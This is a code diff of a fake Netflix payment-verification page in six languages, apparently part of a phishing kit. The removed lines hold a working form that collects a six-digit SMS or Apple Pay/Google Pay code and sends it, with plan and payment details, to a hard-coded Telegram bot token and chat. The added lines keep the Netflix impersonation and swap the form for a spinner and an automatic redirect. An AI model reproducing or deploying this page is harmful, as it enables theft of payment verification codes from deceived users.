@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">Vérification SMS - Netflix</title>
+    <title id="pageTitle">Vérification - Netflix</title>
     <style>
         * {
             margin: 0;
@@ -225,6 +225,34 @@
             margin-bottom: 20px;
             font-size: 16px;
         }
+
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #e50914;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-message {
+            text-align: center;
+            margin: 10px 0;
+            color: #737373;
+        }
     </style>
 </head>
 <body>
@@ -247,169 +275,174 @@
         </div>
         <div class="progress-step">
             <div class="step-number">2</div>
-            <div class="step-label" id="step2Label">Création du compte</div>
+            <div class="step-label" id="step2Label">Paiement</div>
         </div>
         <div class="progress-step">
             <div class="step-number">3</div>
-            <div class="step-label" id="step3Label">Paiement</div>
-        </div>
-        <div class="progress-step">
-            <div class="step-number">4</div>
-            <div class="step-label" id="step4Label">Vérification</div>
+            <div class="step-label" id="step3Label">Vérification</div>
         </div>
     </div>
 
     <div class="container">
         <div class="verification-container">
-            <h1 class="page-title" id="verificationTitle">Vérification du code SMS</h1>
+            <h1 class="page-title" id="heading">Vérification</h1>
             
-            <div class="selected-plan-display" id="selectedPlanDisplay">
-                Standard - 13,49 €/mois - Paiement Apple Pay
+            <div class="selected-plan-display" id="chosenPlanText"></div>
+            
+            <div class="spinner-container" id="spinnerContainer">
+                <div class="spinner"></div>
+                <div class="status-message" id="verifyingMsg">Nous vérifions votre abonnement... veuillez patienter.</div>
+                <div class="status-message" id="redirectMsg">Redirection dans 5 s...</div>
             </div>
             
-            <div class="verification-message" id="verificationMessage">
-                Nous avons envoyé un code de vérification à votre appareil associé à Apple Pay/Google Pay. 
-                Entrez ce code pour compléter votre paiement.
+            <div id="noPlanSelected" style="display: none; text-align: center;">
+                <div class="verification-message">Aucune offre sélectionnée</div>
+                <a href="paiement.html" class="submit-button" id="backToPlans">Retour au choix de l'offre</a>
             </div>
-            
-            <form id="smsVerificationForm">
-                <div class="sms-code-container">
-                    <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit1">
-                    <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit2">
-                    <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit3">
-                    <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit4">
-                    <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit5">
-                    <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit6">
+
+            <footer class="footer">
+                <div class="footer-links">
+                    <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
+                    <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
+                    <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
+                    <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
                 </div>
-                
-                <button type="submit" class="submit-button" id="verifyButton">Vérifier</button>
-                
-                <div class="help-text">
-                    Une question ? <a href="#" class="help-link" id="helpLink">Contactez notre service client</a>
-                </div>
-            </form>
-            
-            <div class="resend-code">
-                Vous n'avez pas reçu le code ? <a href="#" class="resend-link" id="resendLink">Renvoyer le code SMS</a>
-            </div>
+                <p class="footer-text" id="copyrightText">© 2023 Netflix, Inc.</p>
+            </footer>
         </div>
     </div>
-
-    <footer class="footer">
-        <div class="footer-links">
-            <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
-            <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
-            <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
-            <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
-        </div>
-        <p class="footer-text" id="copyrightText">© 2023 Netflix, Inc.</p>
-    </footer>
 
     <script>
         // Traductions multilingues complètes
         const translations = {
             fr: {
-                pageTitle: "Vérification SMS - Netflix",
+                pageTitle: "Vérification - Netflix",
+                heading: "Vérification",
                 step1: "Choix de l'offre",
-                step2: "Création du compte",
-                step3: "Paiement",
-                step4: "Vérification",
-                verificationTitle: "Vérification du code SMS",
-                verificationMessage: "Nous avons envoyé un code de vérification à votre appareil associé à Apple Pay/Google Pay. Entrez ce code pour compléter votre paiement.",
-                verifyButton: "Vérifier",
-                helpLink: "Contactez notre service client",
-                resendLink: "Renvoyer le code SMS",
+                step2: "Paiement",
+                step3: "Vérification",
+                selectedPlanPrefix: "Offre choisie : ",
+                verifyingMsg: "Nous vérifions votre abonnement... veuillez patienter.",
+                redirectMsg: "Redirection dans 5 s...",
+                backToPlans: "Retour au choix de l'offre",
                 terms: "Conditions d'utilisation",
                 privacy: "Confidentialité",
                 legal: "Mentions légales",
                 cookies: "Préférences de cookies",
-                copyright: "© 2023 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc.",
+                noPlanSelected: "Aucune offre sélectionnée"
             },
             en: {
-                pageTitle: "SMS Verification - Netflix",
-                step1: "Plan selection",
-                step2: "Account creation",
-                step3: "Payment",
-                step4: "Verification",
-                verificationTitle: "SMS Verification Code",
-                verificationMessage: "We've sent a verification code to your device associated with Apple Pay/Google Pay. Enter this code to complete your payment.",
-                verifyButton: "Verify",
-                helpLink: "Contact customer service",
-                resendLink: "Resend SMS code",
+                pageTitle: "Verification - Netflix",
+                heading: "Verification",
+                step1: "Choose plan",
+                step2: "Payment",
+                step3: "Verification",
+                selectedPlanPrefix: "Selected plan: ",
+                verifyingMsg: "We're verifying your subscription... please wait.",
+                redirectMsg: "Redirecting in 5 s...",
+                backToPlans: "Back to plan selection",
                 terms: "Terms of Use",
                 privacy: "Privacy",
                 legal: "Legal Notices",
                 cookies: "Cookie Preferences",
-                copyright: "© 2023 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc.",
+                noPlanSelected: "No plan selected"
             },
             es: {
-                pageTitle: "Verificación SMS - Netflix",
-                step1: "Selección de plan",
-                step2: "Creación de cuenta",
-                step3: "Pago",
-                step4: "Verificación",
-                verificationTitle: "Código de verificación SMS",
-                verificationMessage: "Hemos enviado un código de verificación a su dispositivo asociado con Apple Pay/Google Pay. Ingrese este código para completar su pago.",
-                verifyButton: "Verificar",
-                helpLink: "Contactar al servicio al cliente",
-                resendLink: "Reenviar código SMS",
+                pageTitle: "Verificación - Netflix",
+                heading: "Verificación",
+                step1: "Elegir plan",
+                step2: "Pago",
+                step3: "Verificación",
+                selectedPlanPrefix: "Plan seleccionado: ",
+                verifyingMsg: "Estamos verificando tu suscripción... por favor espera.",
+                redirectMsg: "Redireccionando en 5 s...",
+                backToPlans: "Volver a selección de plan",
                 terms: "Términos de uso",
                 privacy: "Privacidad",
                 legal: "Avisos legales",
                 cookies: "Preferencias de cookies",
-                copyright: "© 2023 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc.",
+                noPlanSelected: "Ningún plan seleccionado"
             },
             de: {
-                pageTitle: "SMS-Verifizierung - Netflix",
-                step1: "Planauswahl",
-                step2: "Kontoerstellung",
-                step3: "Zahlung",
-                step4: "Verifizierung",
-                verificationTitle: "SMS-Verifizierungscode",
-                verificationMessage: "Wir haben einen Bestätigungscode an Ihr mit Apple Pay/Google Pay verknüpftes Gerät gesendet. Geben Sie diesen Code ein, um Ihre Zahlung abzuschließen.",
-                verifyButton: "Überprüfen",
-                helpLink: "Kundendienst kontaktieren",
-                resendLink: "SMS-Code erneut senden",
+                pageTitle: "Verifizierung - Netflix",
+                heading: "Verifizierung",
+                step1: "Plan wählen",
+                step2: "Zahlung",
+                step3: "Verifizierung",
+                selectedPlanPrefix: "Ausgewählter Plan: ",
+                verifyingMsg: "Wir überprüfen Ihr Abonnement... bitte warten.",
+                redirectMsg: "Weiterleitung in 5 s...",
+                backToPlans: "Zurück zur Planauswahl",
                 terms: "Nutzungsbedingungen",
                 privacy: "Datenschutz",
                 legal: "Rechtliche Hinweise",
                 cookies: "Cookie-Einstellungen",
-                copyright: "© 2023 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc.",
+                noPlanSelected: "Kein Plan ausgewählt"
             },
             ru: {
-                pageTitle: "SMS-подтверждение - Netflix",
+                pageTitle: "Проверка - Netflix",
+                heading: "Проверка",
                 step1: "Выбор тарифа",
-                step2: "Создание аккаунта",
-                step3: "Оплата",
-                step4: "Подтверждение",
-                verificationTitle: "Код SMS-подтверждения",
-                verificationMessage: "Мы отправили код подтверждения на ваше устройство, связанное с Apple Pay/Google Pay. Введите этот код для завершения оплаты.",
-                verifyButton: "Подтвердить",
-                helpLink: "Связаться со службой поддержки",
-                resendLink: "Отправить код повторно",
+                step2: "Оплата",
+                step3: "Проверка",
+                selectedPlanPrefix: "Выбранный тариф: ",
+                verifyingMsg: "Проверяем вашу подписку... пожалуйста, подождите.",
+                redirectMsg: "Перенаправление через 5 с...",
+                backToPlans: "Вернуться к выбору тарифа",
                 terms: "Условия использования",
                 privacy: "Конфиденциальность",
                 legal: "Юридические уведомления",
                 cookies: "Настройки cookie",
-                copyright: "© 2023 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc.",
+                noPlanSelected: "Тариф не выбран"
             },
             pl: {
-                pageTitle: "Weryfikacja SMS - Netflix",
+                pageTitle: "Weryfikacja - Netflix",
+                heading: "Weryfikacja",
                 step1: "Wybór planu",
-                step2: "Tworzenie konta",
-                step3: "Płatność",
-                step4: "Weryfikacja",
-                verificationTitle: "Kod weryfikacyjny SMS",
-                verificationMessage: "Wysłaliśmy kod weryfikacyjny na Twoje urządzenie powiązane z Apple Pay/Google Pay. Wprowadź ten kod, aby zakończyć płatność.",
-                verifyButton: "Zweryfikuj",
-                helpLink: "Skontaktuj się z obsługą klienta",
-                resendLink: "Wyślij kod SMS ponownie",
+                step2: "Płatność",
+                step3: "Weryfikacja",
+                selectedPlanPrefix: "Wybrany plan: ",
+                verifyingMsg: "Weryfikujemy Twoją subskrypcję... proszę czekać.",
+                redirectMsg: "Przekierowanie za 5 s...",
+                backToPlans: "Powrót do wyboru planu",
                 terms: "Warunki korzystania",
                 privacy: "Prywatność",
                 legal: "Informacje prawne",
                 cookies: "Preferencje dotyczące plików cookie",
-                copyright: "© 2023 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc.",
+                noPlanSelected: "Nie wybrano planu"
             }
+        };
+
+        const monthlySuffix = {
+            fr: "/mois",
+            en: "/month",
+            es: "/mes",
+            de: "/Monat",
+            ru: "/месяц",
+            pl: "/miesiąc"
+        };
+
+        // Mapping des IDs aux clés de traduction
+        const idMap = {
+            'pageTitle': 'pageTitle',
+            'heading': 'heading',
+            'step1Label': 'step1',
+            'step2Label': 'step2',
+            'step3Label': 'step3',
+            'verifyingMsg': 'verifyingMsg',
+            'redirectMsg': 'redirectMsg',
+            'backToPlans': 'backToPlans',
+            'termsLink': 'terms',
+            'privacyLink': 'privacy',
+            'legalLink': 'legal',
+            'cookiesLink': 'cookies',
+            'copyrightText': 'copyright'
         };
 
         function getLanguage() {
@@ -417,22 +450,22 @@
             const langParam = urlParams.get('lang');
             
             if (langParam && translations[langParam]) {
-                localStorage.setItem('NetflixLang', langParam);
+                localStorage.setItem('netflixLang', langParam);
                 return langParam;
             }
             
-            return localStorage.getItem('NetflixLang') || 'fr';
+            return localStorage.getItem('netflixLang') || 'fr';
         }
 
         function updateLanguage(lang) {
             const trans = translations[lang];
             if (!trans) return;
             
-            // Mise à jour de tous les éléments avec ID
-            document.querySelectorAll('[id]').forEach(element => {
-                const key = element.id;
-                if (trans[key]) {
-                    element.textContent = trans[key];
+            // Mise à jour de tous les éléments avec ID mappés
+            Object.keys(idMap).forEach(id => {
+                const element = document.getElementById(id);
+                if (element) {
+                    element.textContent = trans[idMap[id]];
                 }
             });
             
@@ -442,8 +475,78 @@
                 languageSelector.value = lang;
             }
             
-            // Mise à jour du titre de la page
+            // Mise à jour du titre de la page et de la langue HTML
             document.title = trans.pageTitle;
+            document.documentElement.lang = lang;
+            
+            // Mise à jour de l'affichage du plan sélectionné
+            updateSelectedPlanDisplay(lang);
+        }
+
+        function updateSelectedPlanDisplay(lang) {
+            const selectedPlanDisplay = document.getElementById('chosenPlanText');
+            const noPlanSelectedDiv = document.getElementById('noPlanSelected');
+            const spinnerContainer = document.getElementById('spinnerContainer');
+            
+            const planData = localStorage.getItem('netflixSelectedPlan');
+            
+            if (planData) {
+                try {
+                    const plan = JSON.parse(planData);
+                    const trans = translations[lang] || translations.fr;
+                    
+                    selectedPlanDisplay.textContent = 
+                        trans.selectedPlanPrefix + 
+                        plan.planName + " - " + 
+                        plan.planPrice + " " + 
+                        monthlySuffix[lang];
+                    
+                    selectedPlanDisplay.style.display = 'block';
+                    noPlanSelectedDiv.style.display = 'none';
+                    spinnerContainer.style.display = 'flex';
+                    
+                    // Démarrer la redirection après 5 secondes
+                    startRedirectionTimer();
+                } catch (e) {
+                    console.error('Error parsing plan data:', e);
+                    showNoPlanSelected(lang);
+                }
+            } else {
+                showNoPlanSelected(lang);
+            }
+        }
+
+        function showNoPlanSelected(lang) {
+            const selectedPlanDisplay = document.getElementById('chosenPlanText');
+            const noPlanSelectedDiv = document.getElementById('noPlanSelected');
+            const spinnerContainer = document.getElementById('spinnerContainer');
+            const trans = translations[lang] || translations.fr;
+            
+            selectedPlanDisplay.style.display = 'none';
+            noPlanSelectedDiv.style.display = 'block';
+            spinnerContainer.style.display = 'none';
+            
+            document.getElementById('noPlanSelected').querySelector('.verification-message').textContent = 
+                trans.noPlanSelected || "Aucune offre sélectionnée";
+        }
+
+        function startRedirectionTimer() {
+            const redirectMsg = document.getElementById('redirectMsg');
+            let secondsLeft = 5;
+            
+            const countdown = setInterval(() => {
+                secondsLeft--;
+                
+                const lang = getLanguage();
+                const trans = translations[lang] || translations.fr;
+                
+                redirectMsg.textContent = trans.redirectMsg.replace('5', secondsLeft);
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = "success.html";
+                }
+            }, 1000);
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -454,129 +557,9 @@
             if (languageSelector) {
                 languageSelector.addEventListener('change', function() {
                     const newLang = this.value;
-                    localStorage.setItem('NetflixLang', newLang);
+                    localStorage.setItem('netflixLang', newLang);
                     updateLanguage(newLang);
                 });
-            }
-            
-            // Gestion de la saisie du code SMS
-            const smsInputs = document.querySelectorAll('.sms-code-input');
-            smsInputs.forEach((input, index) => {
-                input.addEventListener('input', (e) => {
-                    if (e.target.value.length === 1) {
-                        if (index < smsInputs.length - 1) {
-                            smsInputs[index + 1].focus();
-                        }
-                    }
-                });
-                
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && e.target.value.length === 0) {
-                        if (index > 0) {
-                            smsInputs[index - 1].focus();
-                        }
-                    }
-                });
-            });
-            
-            // Gestion du formulaire de vérification
-            document.getElementById('smsVerificationForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // Récupération du code SMS
-                let smsCode = '';
-                smsInputs.forEach(input => {
-                    smsCode += input.value;
-                });
-                
-                if (smsCode.length !== 6) {
-                    alert(lang === 'en' ? 'Please enter the 6-digit code' : 
-                          lang === 'es' ? 'Por favor ingrese el código de 6 dígitos' : 
-                          lang === 'de' ? 'Bitte geben Sie den 6-stelligen Code ein' : 
-                          lang === 'ru' ? 'Пожалуйста, введите 6-значный код' : 
-                          lang === 'pl' ? 'Proszę wprowadzić 6-cyfrowy kod' : 
-                          'Veuillez entrer le code à 6 chiffres');
-                    return;
-                }
-                
-                // Récupération des paramètres de l'URL
-                const urlParams = new URLSearchParams(window.location.search);
-                const plan = urlParams.get('plan') || 'Inconnu';
-                const price = urlParams.get('price') || 'Inconnu';
-                const method = urlParams.get('method') || 'Apple Pay/Google Pay';
-                
-                // Envoi des données à Telegram
-                const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
-                const chatId = '-4883048028';
-                
-                const message = `🔐 NOUVELLE VÉRIFICATION SMS Netflix 🔐
-
-📱 Code SMS: ${smsCode}
-💳 Méthode de paiement: ${method}
-🏷 Offre: ${plan}
-💰 Prix: ${price}
-
-⏰ ${new Date().toLocaleString()}
-🌍 Langue: ${lang.toUpperCase()}`;
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Code SMS envoyé à Telegram:', data);
-                    window.location.href = `confirmation.html?lang=${lang}`;
-                })
-                .catch(error => {
-                    console.error('Erreur:', error);
-                });
-            });
-            
-            // Gestion du renvoi de code SMS
-            document.getElementById('resendLink').addEventListener('click', function(e) {
-                e.preventDefault();
-                alert(lang === 'en' ? 'A new SMS code has been sent' : 
-                      lang === 'es' ? 'Se ha enviado un nuevo código SMS' : 
-                      lang === 'de' ? 'Ein neuer SMS-Code wurde gesendet' : 
-                      lang === 'ru' ? 'Новый SMS-код был отправлен' : 
-                      lang === 'pl' ? 'Nowy kod SMS został wysłany' : 
-                      'Un nouveau code SMS a été envoyé');
-            });
-            
-            // Mise à jour de l'affichage du plan sélectionné
-            const urlParams = new URLSearchParams(window.location.search);
-            const plan = urlParams.get('plan');
-            const price = urlParams.get('price');
-            const method = urlParams.get('method') || 'Apple Pay';
-            
-            if (plan && price) {
-                const monthlyText = lang === 'en' ? '/month' : 
-                                 lang === 'es' ? '/mes' : 
-                                 lang === 'de' ? '/Monat' : 
-                                 lang === 'ru' ? '/месяц' : 
-                                 lang === 'pl' ? '/miesiąc' : '/mois';
-                
-                const methodText = method === 'Apple Pay' ? 
-                                (lang === 'en' ? 'Apple Pay' : 
-                                 lang === 'es' ? 'Apple Pay' : 
-                                 lang === 'de' ? 'Apple Pay' : 
-                                 lang === 'ru' ? 'Apple Pay' : 
-                                 lang === 'pl' ? 'Apple Pay' : 'Paiement Apple Pay') :
-                                (lang === 'en' ? 'Google Pay' : 
-                                 lang === 'es' ? 'Google Pay' : 
-                                 lang === 'de' ? 'Google Pay' : 
-                                 lang === 'ru' ? 'Google Pay' : 
-                                 lang === 'pl' ? 'Google Pay' : 'Paiement Google Pay');
-                
-                document.getElementById('selectedPlanDisplay').textContent = 
-                    `${plan} - ${price}${monthlyText} - ${methodText}`;
             }
         });
     </script>
